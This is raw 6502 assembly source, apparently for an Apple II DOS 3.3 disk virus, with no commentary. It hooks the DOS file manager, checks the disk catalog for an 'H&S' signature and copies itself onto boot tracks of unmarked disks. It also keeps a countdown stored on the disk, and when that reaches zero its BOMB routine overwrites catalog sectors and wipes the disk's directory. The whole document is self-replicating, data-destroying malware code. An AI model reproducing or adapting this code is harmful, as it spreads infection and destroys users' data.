BUFFER EQU $9A00
DCOUNT EQU BUFFER+$6
SSAV1 EQU $B39B
FMDRVN EQU $B5C0
FMSLTN EQU $B5C1
RWTS EQU $B7B5
BUFCOPY EQU BUFFER+$5D
RSTFMW EQU $AE6A
SUBCODE EQU $B5BC
 ORG $AB06
 OBJ $800
FILMGR TSX
 STX SSAV1
 JSR DDOS
 ORG $B75D
 OBJ $800
DOSCOPY LDA #$1B
 STA $B7E1
 LDA #$02
 STA $B7EC
 LDA #$04
 STA $B7ED
 LDA #$02
 STA $B7F4
 JSR $B793
 LDA $B7E7
 STA $B6FE
 CLC
 ADC #$09
 STA $B7F1
 LDA #$0A
 STA $B7E1
 SEC
 SBC #$01
 STA $B6FF
 STA $B7ED
 JSR $B793
 RTS
 ORG $9B00
 OBJ $800
GETSC STX IBTRK
 STY IBSC
 STA IBCMD
 LDA /IOB
 LDY #IOB
 JSR RWTS
 RTS
MCOUNT HEX 0004
BOOTCNT HEX 03
COUNT HEX 10
DDOS PHP
 PHA
 TXA
 PHA
 TYA
 PHA
 LDA BOOTCNT
 BEQ DDOS2
 BMI DDOS2
 DEC BOOTCNT
 JMP RESTOR
DDOS2 JSR RSTFMW
 LDA SUBCODE
 BEQ >1
 JMP RESTOR
^1 LDA FMDRVN
 BEQ GETCAT
 STA IBDRVN
 LDA FMSLTN
 ASL
 ASL
 ASL
 ASL
 STA IBSLT
GETCAT LDA #BUFFER
 STA IBBUFR
 LDA /BUFFER
 STA IBBUFR+1
 LDX #$11
 LDY #$0F
 LDA #$01
 JSR GETSC
 BCS ERROR
 LDA BOOTCNT
 BNE CHECKID
 DEC BOOTCNT
 LDA DCOUNT
 STA MCOUNT
 LDA DCOUNT+1
 STA MCOUNT+1
CHECKID LDA #$48
 CMP BUFFER+3
 BNE COPYDOS
 LDA #$26
 CMP BUFFER+4
 BNE COPYDOS
 LDA #$53
 CMP BUFFER+5
 BNE COPYDOS
CHEKMCNT LDA MCOUNT
 ORA MCOUNT+1
 BEQ BOMB2
DECMCNT DEC MCOUNT
 LDA MCOUNT
 CMP #$FF
 BNE COMPCNT
 DEC MCOUNT+1
COMPCNT LDA DCOUNT+1
 CMP MCOUNT+1
 BMI RESTOR
 BEQ COMPCNT2
 BPL COPYCNT
COMPCNT2 LDA DCOUNT
 CMP MCOUNT
 BMI RESTOR
COPYCNT LDA MCOUNT
 STA DCOUNT
 LDA MCOUNT+1
 STA DCOUNT+1
 LDX #$11
 LDY #$0F
 LDA #$02
 JSR GETSC
RESTOR PLA
 TAY
 PLA
 TAX
 PLA
 PLP
 JMP $AE6A
BOMB2 JMP BOMB
ERROR PLA
 PLA
 PLA
 PLA
 LDX #$08
 STX $AA5C
 JMP $A6D5
COPYDOS LDA #$48
 STA BUFFER+3
 LDA #$26
 STA BUFFER+4
 LDA #$53
 STA BUFFER+5
 LDA MCOUNT
 STA DCOUNT
 LDA MCOUNT+1
 STA DCOUNT+1
 LDX #$11
 LDY #$0F
 LDA #$02
 JSR GETSC
 BCS RESTOR
 LDX #$00
 LDY #$01
 TYA
 JSR GETSC
 LDX #$37
LOOP1 LDA DOSCOPY,X
 STA BUFCOPY,X
 DEX
 BPL LOOP1
 INX
 LDY #$01
 LDA #$02
 JSR GETSC
 LDA /$9B00
 STA IBBUFR+1
 LDA #$04
 STA BOOTCNT
 LDX #$00
 LDY #$0A
 LDA #$02
 JSR GETSC
 LDA #$FF
 STA BOOTCNT
 INC IBBUFR+1
 LDX #$00
 LDY #$0B
 LDA #$02
 JSR GETSC
 INC IBBUFR+1
 LDX #$00
 LDY #$0C
 LDA #$02
 JSR GETSC
 LDA /$AB00
 STA IBBUFR+1
 LDX #$01
 LDY #$0A
 LDA #$02
 JSR GETSC
 JMP RESTOR
BOMB LDA #$AB
 STA BUFFER+1
 LDA #$10
 STA COUNT
LOOP2 DEC COUNT
 LDX #$11
 LDY COUNT
 LDA #$02
 JSR GETSC
 LDY COUNT
 BNE LOOP2
 JMP RESTOR
IOB HEX 01
IBSLT HEX 60
IBDRVN HEX 01
IBVOL HEX 00
IBTRK HEX 00
IBSC HEX 00
IBDCT ADR DCT
IBBUFR HEX 0000
 HEX 0000
IBCMD HEX 00
IBSTAT HEX 00
 HEX 006001
DCT HEX 0001EFD8
 END